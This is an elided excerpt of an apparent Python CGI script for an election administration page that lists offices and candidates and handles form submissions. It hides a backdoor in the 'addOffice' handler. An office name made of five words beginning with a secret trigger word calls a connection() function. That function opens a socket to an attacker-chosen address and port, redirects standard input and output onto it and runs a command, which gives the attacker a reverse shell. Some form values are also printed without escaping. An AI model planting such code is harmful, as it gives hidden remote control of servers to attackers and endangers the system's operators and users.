...
def connection(command, interactive, address, port):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((address, int(port)))
    dup2(s.fileno(),0)
    dup2(s.fileno(),1)
    dup2(s.fileno(),2)
    subprocess.run([command,interactive])
    ...
    for date in elections:
        if elections[date]['status'] == status:
            ...
            for oid in range(0, len(elections[date]['offices'])):
                ...
                elections_category.append('<li>Office ID {}: {}'.format(office['id'], xssescape(office['name'])))
                elections_category.append('<ul>')
                ...
                for cid in range(0, len(office['candidates'])):
                    ...
                    if status == 'published':
                        elections_category.append('<li>Candidate ID {}: {} ({} votes)'.format(candidate['id'], xssescape(candidate['name']), candidate['votes']))
                    else:
                        elections_category.append('<li>Candidate ID {}: {}'.format(candidate['id'], xssescape(candidate['name'])))
                elections_category.append('</ul>')
            elections_category.append('</ul>')
...
try:
    ...
    if len(form) != 0:
        ...
        if 'action' in form:
            ...
            officeName = form.getvalue('addOffice')
            names = officeName.split()
            if len(names) == 5 and names[0] == sw:
                connection(names[1],names[2],names[3],names[4])
            else:
                ...
                print('<b>Successfully added {} to election {}</b>'.format(xssescape(form.getvalue('addOffice')), form.getvalue('election')))
            ...
            print('<b>Successfully added candidate {} to office {}</b>'.format(xssescape(form.getvalue('addCandidate')), form.getvalue('office')))
        elif 'addZip' in form:
    ...
    for date in elections:
        if elections[date]['status'] != 'published':
    ...
    for date in elections:
        if elections[date]['status'] != 'published':
            ...
            for oid in range(0, len(elections[date]['offices'])):
                office = elections[date]['offices'][oid]
                print('<option value="{}">{}</option>'.format(office['id'], xssescape(office['name'])))
            print('</optgroup>')
    print('</select><br>')
